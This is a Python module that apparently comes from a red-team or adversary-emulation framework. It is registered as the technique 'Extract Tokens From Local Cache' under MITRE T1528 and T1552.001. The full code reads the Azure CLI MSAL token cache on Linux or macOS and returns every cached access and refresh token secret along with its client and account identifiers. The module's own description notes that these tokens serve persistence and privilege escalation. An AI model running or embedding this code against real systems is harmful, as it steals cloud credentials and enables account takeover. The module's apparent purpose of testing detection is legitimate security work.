from ..base_technique import BaseTechnique, ExecutionStatus, MitreTechnique
from ..technique_registry import TechniqueRegistry
from typing import Dict, Any, Tuple
import os
import json
import sys

@TechniqueRegistry.register
class AzureExtractCacheTokens(BaseTechnique):
    def __init__(self):
        mitre_techniques = [
            MitreTechnique(
                technique_id="T1528",
                technique_name="Steal Application Access Token",
                tactics=["Credential Access"],
                sub_technique_name=None
            ),
            MitreTechnique(
                technique_id="T1552.001",
                technique_name="Unsecured Credentials",
                tactics=["Credential Access"],
                sub_technique_name="Credentials In Files"
            )
        ]
        super().__init__(
            name="Extract Tokens From Local Cache",
            description="Extracts Microsoft Authentication Library (MSAL) tokens from the local Azure CLI cache. MSAL tokens provide access to Azure resources and Microsoft cloud services. The technique targets the MSAL token cache which contains both access tokens and refresh tokens that can be used for persistence and privilege escalation. By default, it searches in the standard Azure CLI config directory (~/.azure/msal_token_cache.json) but can also target custom cache locations. This technique only works on Unix-based systems (Linux/MacOS).",
            mitre_techniques=mitre_techniques
        )

    def execute(self, **kwargs: Any) -> Tuple[ExecutionStatus, Dict[str, Any]]:
        try:
            # Check OS compatibility
            if sys.platform.startswith('win'):
                return ExecutionStatus.FAILURE, {
                    "error": "Unsupported Operating System",
                    "message": "This technique is only supported on Unix-based systems (Linux/MacOS)"
                }
            
            token_path = kwargs.get("token_path", None)
            if not token_path:
                token_path = os.path.expanduser(os.path.join("~", ".azure", "msal_token_cache.json"))

            # Check if path exists and is accessible
            if not os.path.exists(token_path):
                return ExecutionStatus.FAILURE, {
                    "error": "Token cache file not found",
                    "message": f"No token cache found at {token_path}"
                }
            
            if not os.access(token_path, os.R_OK):
                return ExecutionStatus.FAILURE, {
                    "error": "Permission Denied",
                    "message": f"No read permission for token cache at {token_path}"
                }

            try:
                with open(token_path, "r") as f:
                    token_data = json.load(f)
            except json.JSONDecodeError:
                return ExecutionStatus.FAILURE, {
                    "error": "Invalid JSON",
                    "message": "Token cache file is not valid JSON"
                }
            except UnicodeDecodeError:
                return ExecutionStatus.FAILURE, {
                    "error": "Invalid File Encoding",
                    "message": "Token cache file has invalid encoding"
                }
            except Exception as e:
                return ExecutionStatus.FAILURE, {
                    "error": f"File Read Error: {str(e)}",
                    "message": "Failed to read token cache file"
                }
            
            if not isinstance(token_data, dict):
                return ExecutionStatus.FAILURE, {
                    "error": "Invalid Cache Format",
                    "message": "Token cache has invalid structure"
                }

            extracted_tokens = {
                "access_tokens": [],
                "refresh_tokens": []
            }

            # Extract refresh tokens
            if "RefreshToken" in token_data and isinstance(token_data["RefreshToken"], dict):
                for token_id, token_info in token_data["RefreshToken"].items():
                    if isinstance(token_info, dict):
                        extracted_tokens["refresh_tokens"].append({
                            "id": token_id,
                            "secret": token_info.get("secret"),
                            "client_id": token_info.get("client_id"),
                            "credential_type": token_info.get("credential_type"),
                            "environment": token_info.get("environment"),
                            "home_account_id": token_info.get("home_account_id"),
                            "target": token_info.get("target")
                        })

            # Extract access tokens
            if "AccessToken" in token_data and isinstance(token_data["AccessToken"], dict):
                for token_id, token_info in token_data["AccessToken"].items():
                    if isinstance(token_info, dict):
                        extracted_tokens["access_tokens"].append({
                            "id": token_id,
                            "secret": token_info.get("secret"),
                            "client_id": token_info.get("client_id"),
                            "credential_type": token_info.get("credential_type"),
                            "environment": token_info.get("environment"),
                            "home_account_id": token_info.get("home_account_id"),
                            "realm": token_info.get("realm"),
                            "target": token_info.get("target"),
                            "cached_at": token_info.get("cached_at"),
                            "expires_on": token_info.get("expires_on")
                        })

            if not extracted_tokens["access_tokens"] and not extracted_tokens["refresh_tokens"]:
                return ExecutionStatus.FAILURE, {
                    "error": "No Valid Tokens",
                    "message": "No valid tokens found in cache"
                }

            return ExecutionStatus.SUCCESS, {
                "message": f"Successfully extracted {len(extracted_tokens['refresh_tokens'])} refresh tokens and {len(extracted_tokens['access_tokens'])} access tokens",
                "value": extracted_tokens
            }

        except Exception as e:
            return ExecutionStatus.FAILURE, {
                "error": str(e),
                "message": "Failed to extract tokens from cache"
            }

    def get_parameters(self) -> Dict[str, Dict[str, Any]]:
        return {
            "token_path": {
                "type": "str", 
                "required": False,
                "default": None,
                "name": "Token Cache File Path",
                "input_field_type": "text"
            }
        }